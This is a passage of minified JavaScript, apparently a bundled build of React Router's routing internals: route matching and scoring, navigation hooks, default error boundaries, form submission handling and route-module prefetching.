        function GG(e, t, r, n) {
            let o = a$(("string" === typeof t ? zG(t) : t).pathname || "/", r);
            if (null == o)
                return null;
            let i = $G(e);
            !function(e) {
                e.sort(( (e, t) => e.score !== t.score ? t.score - e.score : function(e, t) {
                    let r = e.length === t.length && e.slice(0, -1).every(( (e, r) => e === t[r]));
                    return r ? e[e.length - 1] - t[t.length - 1] : 0
                }(e.routesMeta.map((e => e.childrenIndex)), t.routesMeta.map((e => e.childrenIndex)))))
            }(i);
            let s = null;
            for (let a = 0; null == s && a < i.length; ++a) {
                let e = s$(o);
                s = n$(i[a], e, n)
            }
            return s
        }
        function $G(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : []
              , r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : []
              , n = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : ""
              , o = (e, o, i) => {
                let s = {
                    relativePath: void 0 === i ? e.path || "" : i,
                    caseSensitive: !0 === e.caseSensitive,
                    childrenIndex: o,
                    route: e
                };
                s.relativePath.startsWith("/") && (FG(s.relativePath.startsWith(n), 'Absolute route path "'.concat(s.relativePath, '" nested under path "').concat(n, '" is not valid. An absolute child route path must start with the combined path of all its parent routes.')),
                s.relativePath = s.relativePath.slice(n.length));
                let a = h$([n, s.relativePath])
                  , c = r.concat(s);
                e.children && e.children.length > 0 && (FG(!0 !== e.index, 'Index routes must not have child routes. Please remove all child routes from route path "'.concat(a, '".')),
                $G(e.children, t, c, a)),
                (null != e.path || e.index) && t.push({
                    path: a,
                    score: r$(a, e.index),
                    routesMeta: c
                })
            }
            ;
            return e.forEach(( (e, t) => {
                var r;
                if ("" !== e.path && null !== (r = e.path) && void 0 !== r && r.includes("?"))
                    for (let n of KG(e.path))
                        o(e, t, n);
                else
                    o(e, t)
            }
            )),
            t
        }
        function KG(e) {
            let t = e.split("/");
            if (0 === t.length)
                return [];
            let[r,...n] = t
              , o = r.endsWith("?")
              , i = r.replace(/\?$/, "");
            if (0 === n.length)
                return o ? [i, ""] : [i];
            let s = KG(n.join("/"))
              , a = [];
            return a.push(...s.map((e => "" === e ? i : [i, e].join("/")))),
            o && a.push(...s),
            a.map((t => e.startsWith("/") && "" === t ? "/" : t))
        }
        var ZG = /^:[\w-]+$/
          , YG = 3
          , JG = 2
          , XG = 1
          , QG = 10
          , e$ = -2
          , t$ = e => "*" === e;
        function r$(e, t) {
            let r = e.split("/")
              , n = r.length;
            return r.some(t$) && (n += e$),
            t && (n += JG),
            r.filter((e => !t$(e))).reduce(( (e, t) => e + (ZG.test(t) ? YG : "" === t ? XG : QG)), n)
        }
        function n$(e, t) {
            let r = arguments.length > 2 && void 0 !== arguments[2] && arguments[2]
              , {routesMeta: n} = e
              , o = {}
              , i = "/"
              , s = [];
            for (let a = 0; a < n.length; ++a) {
                let e = n[a]
                  , c = a === n.length - 1
                  , l = "/" === i ? t : t.slice(i.length) || "/"
                  , u = o$({
                    path: e.relativePath,
                    caseSensitive: e.caseSensitive,
                    end: c
                }, l)
                  , d = e.route;
                if (!u && c && r && !n[n.length - 1].route.index && (u = o$({
                    path: e.relativePath,
                    caseSensitive: e.caseSensitive,
                    end: !1
                }, l)),
                !u)
                    return null;
                Object.assign(o, u.params),
                s.push({
                    params: o,
                    pathname: h$([i, u.pathname]),
                    pathnameBase: f$(h$([i, u.pathnameBase])),
                    route: d
                }),
                "/" !== u.pathnameBase && (i = h$([i, u.pathnameBase]))
            }
            return s
        }
        function o$(e, t) {
            "string" === typeof e && (e = {
                path: e,
                caseSensitive: !1,
                end: !0
            });
            let[r,n] = i$(e.path, e.caseSensitive, e.end)
              , o = t.match(r);
            if (!o)
                return null;
            let i = o[0]
              , s = i.replace(/(.)\/+$/, "$1")
              , a = o.slice(1);
            return {
                params: n.reduce(( (e, t, r) => {
                    let {paramName: n, isOptional: o} = t;
                    if ("*" === n) {
                        let e = a[r] || "";
                        s = i.slice(0, i.length - e.length).replace(/(.)\/+$/, "$1")
                    }
                    const c = a[r];
                    return e[n] = o && !c ? void 0 : (c || "").replace(/%2F/g, "/"),
                    e
                }
                ), {}),
                pathname: i,
                pathnameBase: s,
                pattern: e
            }
        }
        function i$(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] && arguments[1]
              , r = !(arguments.length > 2 && void 0 !== arguments[2]) || arguments[2];
            UG("*" === e || !e.endsWith("*") || e.endsWith("/*"), 'Route path "'.concat(e, '" will be treated as if it were "').concat(e.replace(/\*$/, "/*"), '" because the `*` character must always follow a `/` in the pattern. To get rid of this warning, please change the route path to "').concat(e.replace(/\*$/, "/*"), '".'));
            let n = []
              , o = "^" + e.replace(/\/*\*?$/, "").replace(/^\/*/, "/").replace(/[\\.*+^${}|()[\]]/g, "\\$&").replace(/\/:([\w-]+)(\?)?/g, ( (e, t, r) => (n.push({
                paramName: t,
                isOptional: null != r
            }),
            r ? "/?([^\\/]+)?" : "/([^\\/]+)")));
            return e.endsWith("*") ? (n.push({
                paramName: "*"
            }),
            o += "*" === e || "/*" === e ? "(.*)$" : "(?:\\/(.+)|\\/*)$") : r ? o += "\\/*$" : "" !== e && "/" !== e && (o += "(?:(?=\\/|$))"),
            [new RegExp(o,t ? void 0 : "i"), n]
        }
        function s$(e) {
            try {
                return e.split("/").map((e => decodeURIComponent(e).replace(/\//g, "%2F"))).join("/")
            } catch (t) {
                return UG(!1, 'The URL path "'.concat(e, '" could not be decoded because it is a malformed URL segment. This is probably due to a bad percent encoding (').concat(t, ").")),
                e
            }
        }
        function a$(e, t) {
            if ("/" === t)
                return e;
            if (!e.toLowerCase().startsWith(t.toLowerCase()))
                return null;
            let r = t.endsWith("/") ? t.length - 1 : t.length
              , n = e.charAt(r);
            return n && "/" !== n ? null : e.slice(r) || "/"
        }
        function c$(e, t, r, n) {
            return "Cannot include a '".concat(e, "' character in a manually specified `to.").concat(t, "` field [").concat(JSON.stringify(n), "].  Please separate it out to the `to.").concat(r, '` field. Alternatively you may provide the full path as a string in <Link to="..."> and the router will parse it for you.')
        }
        function l$(e) {
            return e.filter(( (e, t) => 0 === t || e.route.path && e.route.path.length > 0))
        }
        function u$(e) {
            let t = l$(e);
            return t.map(( (e, r) => r === t.length - 1 ? e.pathname : e.pathnameBase))
        }
        function d$(e, t, r) {
            let n, o = arguments.length > 3 && void 0 !== arguments[3] && arguments[3];
            "string" === typeof e ? n = zG(e) : (n = (0,
            k.A)({}, e),
            FG(!n.pathname || !n.pathname.includes("?"), c$("?", "pathname", "search", n)),
            FG(!n.pathname || !n.pathname.includes("#"), c$("#", "pathname", "hash", n)),
            FG(!n.search || !n.search.includes("#"), c$("#", "search", "hash", n)));
            let i, s = "" === e || "" === n.pathname, a = s ? "/" : n.pathname;
            if (null == a)
                i = r;
            else {
                let e = t.length - 1;
                if (!o && a.startsWith("..")) {
                    let t = a.split("/");
                    for (; ".." === t[0]; )
                        t.shift(),
                        e -= 1;
                    n.pathname = t.join("/")
                }
                i = e >= 0 ? t[e] : "/"
            }
            let c = function(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "/"
                  , {pathname: r, search: n="", hash: o=""} = "string" === typeof e ? zG(e) : e
                  , i = r ? r.startsWith("/") ? r : function(e, t) {
                    let r = t.replace(/\/+$/, "").split("/");
                    return e.split("/").forEach((e => {
                        ".." === e ? r.length > 1 && r.pop() : "." !== e && r.push(e)
                    }
                    )),
                    r.length > 1 ? r.join("/") : "/"
                }(r, t) : t;
                return {
                    pathname: i,
                    search: p$(n),
                    hash: g$(o)
                }
            }(n, i)
              , l = a && "/" !== a && a.endsWith("/")
              , u = (s || "." === a) && r.endsWith("/");
            return c.pathname.endsWith("/") || !l && !u || (c.pathname += "/"),
            c
        }
        var h$ = e => e.join("/").replace(/\/\/+/g, "/")
          , f$ = e => e.replace(/\/+$/, "").replace(/^\/*/, "/")
          , p$ = e => e && "?" !== e ? e.startsWith("?") ? e : "?" + e : ""
          , g$ = e => e && "#" !== e ? e.startsWith("#") ? e : "#" + e : "";
        function y$(e) {
            return null != e && "number" === typeof e.status && "string" === typeof e.statusText && "boolean" === typeof e.internal && "data"in e
        }
        var m$ = ["POST", "PUT", "PATCH", "DELETE"]
          , b$ = (new Set(m$),
        ["GET", ...m$]);
        new Set(b$),
        Symbol("ResetLoaderData");
        var v$ = _.createContext(null);
        v$.displayName = "DataRouter";
        var w$ = _.createContext(null);
        w$.displayName = "DataRouterState";
        var T$ = _.createContext({
            isTransitioning: !1
        });
        T$.displayName = "ViewTransition";
        var A$ = _.createContext(new Map);
        A$.displayName = "Fetchers";
        var E$ = _.createContext(null);
        E$.displayName = "Await";
        var P$ = _.createContext(null);
        P$.displayName = "Navigation";
        var C$ = _.createContext(null);
        C$.displayName = "Location";
        var S$ = _.createContext({
            outlet: null,
            matches: [],
            isDataRoute: !1
        });
        S$.displayName = "Route";
        var I$ = _.createContext(null);
        I$.displayName = "RouteError";
        function B$() {
            return null != _.useContext(C$)
        }
        function x$() {
            return FG(B$(), "useLocation() may be used only in the context of a <Router> component."),
            _.useContext(C$).location
        }
        var O$ = "You should call navigate() in a React.useEffect(), not when your component is first rendered.";
        function _$(e) {
            _.useContext(P$).static || _.useLayoutEffect(e)
        }
        function W$() {
            let {isDataRoute: e} = _.useContext(S$);
            return e ? function() {
                let {router: e} = j$("useNavigate")
                  , t = V$("useNavigate")
                  , r = _.useRef(!1);
                _$(( () => {
                    r.current = !0
                }
                ));
                let n = _.useCallback((async function(n) {
                    let o = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                    UG(r.current, O$),
                    r.current && ("number" === typeof n ? e.navigate(n) : await e.navigate(n, (0,
                    k.A)({
                        fromRouteId: t
                    }, o)))
                }
                ), [e, t]);
                return n
            }() : function() {
                FG(B$(), "useNavigate() may be used only in the context of a <Router> component.");
                let e = _.useContext(v$)
                  , {basename: t, navigator: r} = _.useContext(P$)
                  , {matches: n} = _.useContext(S$)
                  , {pathname: o} = x$()
                  , i = JSON.stringify(u$(n))
                  , s = _.useRef(!1);
                _$(( () => {
                    s.current = !0
                }
                ));
                let a = _.useCallback((function(n) {
                    let a = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                    if (UG(s.current, O$),
                    !s.current)
                        return;
                    if ("number" === typeof n)
                        return void r.go(n);
                    let c = d$(n, JSON.parse(i), o, "path" === a.relative);
                    null == e && "/" !== t && (c.pathname = "/" === c.pathname ? t : h$([t, c.pathname])),
                    (a.replace ? r.replace : r.push)(c, a.state, a)
                }
                ), [t, r, i, o, e]);
                return a
            }()
        }
        _.createContext(null);
        function R$(e) {
            let {relative: t} = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {}
              , {matches: r} = _.useContext(S$)
              , {pathname: n} = x$()
              , o = JSON.stringify(u$(r));
            return _.useMemo(( () => d$(e, JSON.parse(o), n, "path" === t)), [e, o, n, t])
        }
        function k$(e, t, r, n) {
            FG(B$(), "useRoutes() may be used only in the context of a <Router> component.");
            let {navigator: o, static: i} = _.useContext(P$)
              , {matches: s} = _.useContext(S$)
              , a = s[s.length - 1]
              , c = a ? a.params : {}
              , l = a ? a.pathname : "/"
              , u = a ? a.pathnameBase : "/"
              , d = a && a.route;
            {
                let e = d && d.path || "";
                G$(l, !d || e.endsWith("*") || e.endsWith("*?"), 'You rendered descendant <Routes> (or called `useRoutes()`) at "'.concat(l, '" (under <Route path="').concat(e, '">) but the parent route path has no trailing "*". This means if you navigate deeper, the parent won\'t match anymore and therefore the child routes will never render.\n\nPlease change the parent <Route path="').concat(e, '"> to <Route path="').concat("/" === e ? "*" : "".concat(e, "/*"), '">.'))
            }
            let h, f = x$();
            if (t) {
                var p;
                let e = "string" === typeof t ? zG(t) : t;
                FG("/" === u || (null === (p = e.pathname) || void 0 === p ? void 0 : p.startsWith(u)), 'When overriding the location using `<Routes location>` or `useRoutes(routes, location)`, the location pathname must begin with the portion of the URL pathname that was matched by all parent routes. The current pathname base is "'.concat(u, '" but pathname "').concat(e.pathname, '" was given in the `location` prop.')),
                h = e
            } else
                h = f;
            let g = h.pathname || "/"
              , y = g;
            if ("/" !== u) {
                let e = u.replace(/^\//, "").split("/");
                y = "/" + g.replace(/^\//, "").split("/").slice(e.length).join("/")
            }
            let m = !i && r && r.matches && r.matches.length > 0 ? r.matches : qG(e, {
                pathname: y
            });
            UG(d || null != m, 'No routes matched location "'.concat(h.pathname).concat(h.search).concat(h.hash, '" ')),
            UG(null == m || void 0 !== m[m.length - 1].route.element || void 0 !== m[m.length - 1].route.Component || void 0 !== m[m.length - 1].route.lazy, 'Matched leaf route at location "'.concat(h.pathname).concat(h.search).concat(h.hash, '" does not have an element or Component. This means it will render an <Outlet /> with a null value by default resulting in an "empty" page.'));
            let b = D$(m && m.map((e => Object.assign({}, e, {
                params: Object.assign({}, c, e.params),
                pathname: h$([u, o.encodeLocation ? o.encodeLocation(e.pathname).pathname : e.pathname]),
                pathnameBase: "/" === e.pathnameBase ? u : h$([u, o.encodeLocation ? o.encodeLocation(e.pathnameBase).pathname : e.pathnameBase])
            }))), s, r, n);
            return t && b ? _.createElement(C$.Provider, {
                value: {
                    location: (0,
                    k.A)({
                        pathname: "/",
                        search: "",
                        hash: "",
                        state: null,
                        key: "default"
                    }, h),
                    navigationType: "POP"
                }
            }, b) : b
        }
        function M$() {
            let e = H$()
              , t = y$(e) ? "".concat(e.status, " ").concat(e.statusText) : e instanceof Error ? e.message : JSON.stringify(e)
              , r = e instanceof Error ? e.stack : null
              , n = "rgba(200,200,200, 0.5)"
              , o = {
                padding: "0.5rem",
                backgroundColor: n
            }
              , i = {
                padding: "2px 4px",
                backgroundColor: n
            }
              , s = null;
            return console.error("Error handled by React Router default ErrorBoundary:", e),
            s = _.createElement(_.Fragment, null, _.createElement("p", null, "\ud83d\udcbf Hey developer \ud83d\udc4b"), _.createElement("p", null, "You can provide a way better UX than this when your app throws errors by providing your own ", _.createElement("code", {
                style: i
            }, "ErrorBoundary"), " or", " ", _.createElement("code", {
                style: i
            }, "errorElement"), " prop on your route.")),
            _.createElement(_.Fragment, null, _.createElement("h2", null, "Unexpected Application Error!"), _.createElement("h3", {
                style: {
                    fontStyle: "italic"
                }
            }, t), r ? _.createElement("pre", {
                style: o
            }, r) : null, s)
        }
        var N$ = _.createElement(M$, null)
          , F$ = class extends _.Component {
            constructor(e) {
                super(e),
                this.state = {
                    location: e.location,
                    revalidation: e.revalidation,
                    error: e.error
                }
            }
            static getDerivedStateFromError(e) {
                return {
                    error: e
                }
            }
            static getDerivedStateFromProps(e, t) {
                return t.location !== e.location || "idle" !== t.revalidation && "idle" === e.revalidation ? {
                    error: e.error,
                    location: e.location,
                    revalidation: e.revalidation
                } : {
                    error: void 0 !== e.error ? e.error : t.error,
                    location: t.location,
                    revalidation: e.revalidation || t.revalidation
                }
            }
            componentDidCatch(e, t) {
                console.error("React Router caught the following error during render", e, t)
            }
            render() {
                return void 0 !== this.state.error ? _.createElement(S$.Provider, {
                    value: this.props.routeContext
                }, _.createElement(I$.Provider, {
                    value: this.state.error,
                    children: this.props.component
                })) : this.props.children
            }
        }
        ;
        function U$(e) {
            let {routeContext: t, match: r, children: n} = e
              , o = _.useContext(v$);
            return o && o.static && o.staticContext && (r.route.errorElement || r.route.ErrorBoundary) && (o.staticContext._deepestRenderedBoundaryId = r.route.id),
            _.createElement(S$.Provider, {
                value: t
            }, n)
        }
        function D$(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : []
              , r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : null;
            if (null == e) {
                if (!r)
                    return null;
                if (r.errors)
                    e = r.matches;
                else {
                    if (0 !== t.length || r.initialized || !(r.matches.length > 0))
                        return null;
                    e = r.matches
                }
            }
            let n = e
              , o = null === r || void 0 === r ? void 0 : r.errors;
            if (null != o) {
                let e = n.findIndex((e => e.route.id && void 0 !== (null === o || void 0 === o ? void 0 : o[e.route.id])));
                FG(e >= 0, "Could not find a matching route for errors on route IDs: ".concat(Object.keys(o).join(","))),
                n = n.slice(0, Math.min(n.length, e + 1))
            }
            let i = !1
              , s = -1;
            if (r)
                for (let a = 0; a < n.length; a++) {
                    let e = n[a];
                    if ((e.route.HydrateFallback || e.route.hydrateFallbackElement) && (s = a),
                    e.route.id) {
                        let {loaderData: t, errors: o} = r
                          , a = e.route.loader && !t.hasOwnProperty(e.route.id) && (!o || void 0 === o[e.route.id]);
                        if (e.route.lazy || a) {
                            i = !0,
                            n = s >= 0 ? n.slice(0, s + 1) : [n[0]];
                            break
                        }
                    }
                }
            return n.reduceRight(( (e, a, c) => {
                let l, u = !1, d = null, h = null;
                r && (l = o && a.route.id ? o[a.route.id] : void 0,
                d = a.route.errorElement || N$,
                i && (s < 0 && 0 === c ? (G$("route-fallback", !1, "No `HydrateFallback` element provided to render during initial hydration"),
                u = !0,
                h = null) : s === c && (u = !0,
                h = a.route.hydrateFallbackElement || null)));
                let f = t.concat(n.slice(0, c + 1))
                  , p = () => {
                    let t;
                    return t = l ? d : u ? h : a.route.Component ? _.createElement(a.route.Component, null) : a.route.element ? a.route.element : e,
                    _.createElement(U$, {
                        match: a,
                        routeContext: {
                            outlet: e,
                            matches: f,
                            isDataRoute: null != r
                        },
                        children: t
                    })
                }
                ;
                return r && (a.route.ErrorBoundary || a.route.errorElement || 0 === c) ? _.createElement(F$, {
                    location: r.location,
                    revalidation: r.revalidation,
                    component: d,
                    error: l,
                    children: p(),
                    routeContext: {
                        outlet: null,
                        matches: f,
                        isDataRoute: !0
                    }
                }) : p()
            }
            ), null)
        }
        function L$(e) {
            return "".concat(e, " must be used within a data router.  See https://reactrouter.com/en/main/routers/picking-a-router.")
        }
        function j$(e) {
            let t = _.useContext(v$);
            return FG(t, L$(e)),
            t
        }
        function z$(e) {
            let t = _.useContext(w$);
            return FG(t, L$(e)),
            t
        }
        function V$(e) {
            let t = function(e) {
                let t = _.useContext(S$);
                return FG(t, L$(e)),
                t
            }(e)
              , r = t.matches[t.matches.length - 1];
            return FG(r.route.id, "".concat(e, ' can only be used on routes that contain a unique "id"')),
            r.route.id
        }
        function H$() {
            var e;
            let t = _.useContext(I$)
              , r = z$("useRouteError")
              , n = V$("useRouteError");
            return void 0 !== t ? t : null === (e = r.errors) || void 0 === e ? void 0 : e[n]
        }
        var q$ = {};
        function G$(e, t, r) {
            t || q$[e] || (q$[e] = !0,
            UG(!1, r))
        }
        _.memo((function(e) {
            let {routes: t, future: r, state: n} = e;
            return k$(t, void 0, n, r)
        }
        ));
        function $$(e) {
            FG(!1, "A <Route> is only ever to be used as the child of <Routes> element, never rendered directly. Please wrap your <Route> in a <Routes>.")
        }
        function K$(e) {
            let {basename: t="/", children: r=null, location: n, navigationType: o="POP", navigator: i, static: s=!1} = e;
            FG(!B$(), "You cannot render a <Router> inside another <Router>. You should never have more than one in your app.");
            let a = t.replace(/^\/*/, "/")
              , c = _.useMemo(( () => ({
                basename: a,
                navigator: i,
                static: s,
                future: {}
            })), [a, i, s]);
            "string" === typeof n && (n = zG(n));
            let {pathname: l="/", search: u="", hash: d="", state: h=null, key: f="default"} = n
              , p = _.useMemo(( () => {
                let e = a$(l, a);
                return null == e ? null : {
                    location: {
                        pathname: e,
                        search: u,
                        hash: d,
                        state: h,
                        key: f
                    },
                    navigationType: o
                }
            }
            ), [a, l, u, d, h, f, o]);
            return UG(null != p, '<Router basename="'.concat(a, '"> is not able to match the URL "').concat(l).concat(u).concat(d, "\" because it does not start with the basename, so the <Router> won't render anything.")),
            null == p ? null : _.createElement(P$.Provider, {
                value: c
            }, _.createElement(C$.Provider, {
                children: r,
                value: p
            }))
        }
        function Z$(e) {
            let {children: t, location: r} = e;
            return k$(Y$(t), r)
        }
        _.Component;
        function Y$(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : []
              , r = [];
            return _.Children.forEach(e, ( (e, n) => {
                if (!_.isValidElement(e))
                    return;
                let o = [...t, n];
                if (e.type === _.Fragment)
                    return void r.push.apply(r, Y$(e.props.children, o));
                FG(e.type === $$, "[".concat("string" === typeof e.type ? e.type : e.type.name, "] is not a <Route> component. All component children of <Routes> must be a <Route> or <React.Fragment>")),
                FG(!e.props.index || !e.props.children, "An index route cannot have child routes.");
                let i = {
                    id: e.props.id || o.join("-"),
                    caseSensitive: e.props.caseSensitive,
                    element: e.props.element,
                    Component: e.props.Component,
                    index: e.props.index,
                    path: e.props.path,
                    loader: e.props.loader,
                    action: e.props.action,
                    hydrateFallbackElement: e.props.hydrateFallbackElement,
                    HydrateFallback: e.props.HydrateFallback,
                    errorElement: e.props.errorElement,
                    ErrorBoundary: e.props.ErrorBoundary,
                    hasErrorBoundary: !0 === e.props.hasErrorBoundary || null != e.props.ErrorBoundary || null != e.props.errorElement,
                    shouldRevalidate: e.props.shouldRevalidate,
                    handle: e.props.handle,
                    lazy: e.props.lazy
                };
                e.props.children && (i.children = Y$(e.props.children, o)),
                r.push(i)
            }
            )),
            r
        }
        var J$ = "get"
          , X$ = "application/x-www-form-urlencoded";
        function Q$(e) {
            return null != e && "string" === typeof e.tagName
        }
        var eK = null;
        var tK = new Set(["application/x-www-form-urlencoded", "multipart/form-data", "text/plain"]);
        function rK(e) {
            return null == e || tK.has(e) ? e : (UG(!1, '"'.concat(e, '" is not a valid `encType` for `<Form>`/`<fetcher.Form>` and will default to "').concat(X$, '"')),
            null)
        }
        function nK(e, t) {
            let r, n, o, i, s;
            if (Q$(a = e) && "form" === a.tagName.toLowerCase()) {
                let s = e.getAttribute("action");
                n = s ? a$(s, t) : null,
                r = e.getAttribute("method") || J$,
                o = rK(e.getAttribute("enctype")) || X$,
                i = new FormData(e)
            } else if (function(e) {
                return Q$(e) && "button" === e.tagName.toLowerCase()
            }(e) || function(e) {
                return Q$(e) && "input" === e.tagName.toLowerCase()
            }(e) && ("submit" === e.type || "image" === e.type)) {
                let s = e.form;
                if (null == s)
                    throw new Error('Cannot submit a <button> or <input type="submit"> without a <form>');
                let a = e.getAttribute("formaction") || s.getAttribute("action");
                if (n = a ? a$(a, t) : null,
                r = e.getAttribute("formmethod") || s.getAttribute("method") || J$,
                o = rK(e.getAttribute("formenctype")) || rK(s.getAttribute("enctype")) || X$,
                i = new FormData(s,e),
                !function() {
                    if (null === eK)
                        try {
                            new FormData(document.createElement("form"),0),
                            eK = !1
                        } catch (_l) {
                            eK = !0
                        }
                    return eK
                }()) {
                    let {name: t, type: r, value: n} = e;
                    if ("image" === r) {
                        let e = t ? "".concat(t, ".") : "";
                        i.append("".concat(e, "x"), "0"),
                        i.append("".concat(e, "y"), "0")
                    } else
                        t && i.append(t, n)
                }
            } else {
                if (Q$(e))
                    throw new Error('Cannot submit element that is not <form>, <button>, or <input type="submit|image">');
                r = J$,
                n = null,
                o = X$,
                s = e
            }
            var a;
            return i && "text/plain" === o && (s = i,
            i = void 0),
            {
                action: n,
                method: r.toLowerCase(),
                encType: o,
                formData: i,
                body: s
            }
        }
        function oK(e, t) {
            if (!1 === e || null === e || "undefined" === typeof e)
                throw new Error(t)
        }
        async function iK(e, t) {
            if (e.id in t)
                return t[e.id];
            try {
                let r = await import(e.module);
                return t[e.id] = r,
                r
            } catch (r) {
                return console.error("Error loading route module `".concat(e.module, "`, reloading page...")),
                console.error(r),
                window.__reactRouterContext && window.__reactRouterContext.isSpaMode,
                window.location.reload(),
                new Promise(( () => {}
                ))
            }
        }
        function sK(e) {
            return null != e && "string" === typeof e.page
        }
        function aK(e) {
            return null != e && (null == e.href ? "preload" === e.rel && "string" === typeof e.imageSrcSet && "string" === typeof e.imageSizes : "string" === typeof e.rel && "string" === typeof e.href)
        }
        function cK(e, t, r, n, o, i) {
            let s = (e, t) => !r[t] || e.route.id !== r[t].route.id
              , a = (e, t) => {
                var n;
                return r[t].pathname !== e.pathname || (null === (n = r[t].route.path) || void 0 === n ? void 0 : n.endsWith("*")) && r[t].params["*"] !== e.params["*"]
            }
            ;
            return "assets" === i ? t.filter(( (e, t) => s(e, t) || a(e, t))) : "data" === i ? t.filter(( (t, i) => {
                let c = n.routes[t.route.id];
                if (!c || !c.hasLoader)
                    return !1;
                if (s(t, i) || a(t, i))
                    return !0;
                if (t.route.shouldRevalidate) {
                    var l;
                    let n = t.route.shouldRevalidate({
                        currentUrl: new URL(o.pathname + o.search + o.hash,window.origin),
                        currentParams: (null === (l = r[0]) || void 0 === l ? void 0 : l.params) || {},
                        nextUrl: new URL(e,window.origin),
                        nextParams: t.params,
                        defaultShouldRevalidate: !0
                    });
                    if ("boolean" === typeof n)
                        return n
                }
                return !0
            }
            )) : []
        }
        function lK(e, t) {
            let {includeHydrateFallback: r} = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {};
            return n = e.map((e => {
                let n = t.routes[e.route.id];
                if (!n)
                    return [];
                let o = [n.module];
                return n.clientActionModule && (o = o.concat(n.clientActionModule)),
                n.clientLoaderModule && (o = o.concat(n.clientLoaderModule)),
                r && n.hydrateFallbackModule && (o = o.concat(n.hydrateFallbackModule)),
                n.imports && (o = o.concat(n.imports)),
                o
            }
            )).flat(1),
            [...new Set(n)];
            var n
        }
        function uK(e, t) {
            let r = new Set
              , n = new Set(t);
            return e.reduce(( (e, o) => {
                if (t && !sK(o) && "script" === o.as && o.href && n.has(o.href))
                    return e;
                let i = JSON.stringify(function(e) {
                    let t = {}
                      , r = Object.keys(e).sort();
                    for (let n of r)
                        t[n] = e[n];
                    return t
                }(o));
                return r.has(i) || (r.add(i),
                e.push({
                    key: i,
                    link: o
                })),
                e
            }
            ), [])
        }
        function dK(e) {
            return {
                __html: e
            }
        }
        Object.getOwnPropertyNames(Object.prototype).sort().join("\0");
        "undefined" !== typeof window ? window : "undefined" !== typeof globalThis && globalThis;
        Symbol("SingleFetchRedirect");
        var hK = new Set([100, 101, 204, 205]);
        function fK(e, t) {
            let r = "string" === typeof e ? new URL(e,"undefined" === typeof window ? "server://singlefetch/" : window.location.origin) : e;
            return "/" === r.pathname ? r.pathname = "_root.data" : t && "/" === a$(r.pathname, t) ? r.pathname = "".concat(t.replace(/\/$/, ""), "/_root.data") : r.pathname = "".concat(r.pathname.replace(/\/$/, ""), ".data"),
            r
        }
        _.Component;
        function pK(e) {
            let {error: t, isOutsideRemixApp: r} = e;
            console.error(t);
            let n, o = _.createElement("script", {
                dangerouslySetInnerHTML: {
                    __html: '\n        console.log(\n          "\ud83d\udcbf Hey developer \ud83d\udc4b. You can provide a way better UX than this when your app throws errors. Check out https://reactrouter.com/how-to/error-boundary for more information."\n        );\n      '
                }
            });
            if (y$(t))
                return _.createElement(gK, {
                    title: "Unhandled Thrown Response!"
                }, _.createElement("h1", {
                    style: {
                        fontSize: "24px"
                    }
                }, t.status, " ", t.statusText), o);
            if (t instanceof Error)
                0;
            else {
                let e = null == t ? "Unknown Error" : "object" === typeof t && "toString"in t ? t.toString() : JSON.stringify(t);
                new Error(e)
            }
            return _.createElement(gK, {
                title: "Application Error!",
                isOutsideRemixApp: r
            }, _.createElement("h1", {
                style: {
                    fontSize: "24px"
                }
            }, "Application Error"), _.createElement("pre", {
                style: {
                    padding: "2rem",
                    background: "hsla(10, 50%, 50%, 0.1)",
                    color: "red",
                    overflow: "auto"
                }
            }, n.stack), o)
        }
        function gK(e) {
            var t;
            let {title: r, renderScripts: n, isOutsideRemixApp: o, children: i} = e
              , {routeModules: s} = wK();
            return null !== s.root && void 0 !== t && t.Layout && !o ? i : _.createElement("html", {
                lang: "en"
            }, _.createElement("head", null, _.createElement("meta", {
                charSet: "utf-8"
            }), _.createElement("meta", {
                name: "viewport",
                content: "width=device-width,initial-scale=1,viewport-fit=cover"
            }), _.createElement("title", null, r)), _.createElement("body", null, _.createElement("main", {
                style: {
                    fontFamily: "system-ui, sans-serif",
                    padding: "2rem"
                }
            }, i, n ? _.createElement(IK, null) : null)))
        }
        function yK(e, t) {
            return "lazy" === e.mode && !0 === t
        }
        function mK() {
            let e = _.useContext(v$);
            return oK(e, "You must render this element inside a <DataRouterContext.Provider> element"),
            e
        }
        function bK() {
            let e = _.useContext(w$);
            return oK(e, "You must render this element inside a <DataRouterStateContext.Provider> element"),
            e
        }
        var vK = _.createContext(void 0);
        function wK() {
            let e = _.useContext(vK);
            return oK(e, "You must render this element inside a <HydratedRouter> element"),
            e
        }
        function TK(e, t) {
            return r => {
                e && e(r),
                r.defaultPrevented || t(r)
            }
        }
        function AK(e, t, r) {
            if (r && !SK)
                return [e[0]];
            if (t) {
                let r = e.findIndex((e => void 0 !== t[e.route.id]));
                return e.slice(0, r + 1)
            }
            return e
        }
        function EK(e) {
            let {page: t} = e
              , r = R(e, OG)
              , {router: n} = mK()
              , o = _.useMemo(( () => qG(n.routes, t, n.basename)), [n.routes, t, n.basename]);
            return o ? _.createElement(CK, (0,
            k.A)({
                page: t,
                matches: o
            }, r)) : null
        }
        function PK(e) {
            let {manifest: t, routeModules: r} = wK()
              , [n,o] = _.useState([]);
            return _.useEffect(( () => {
                let n = !1;
                return async function(e, t, r) {
                    return uK((await Promise.all(e.map((async e => {
                        let n = t.routes[e.route.id];
                        if (n) {
                            let e = await iK(n, r);
                            return e.links ? e.links() : []
                        }
                        return []
                    }
                    )))).flat(1).filter(aK).filter((e => "stylesheet" === e.rel || "preload" === e.rel)).map((e => "stylesheet" === e.rel ? (0,
                    k.A)((0,
                    k.A)({}, e), {}, {
                        rel: "prefetch",
                        as: "style"
                    }) : (0,
                    k.A)((0,
                    k.A)({}, e), {}, {
                        rel: "prefetch"
                    }))))
                }(e, t, r).then((e => {
                    n || o(e)
                }
                )),
                () => {
                    n = !0
                }
            }
            ), [e, t, r]),
            n
        }
        function CK(e) {
            let {page: t, matches: r} = e
              , n = R(e, _G)
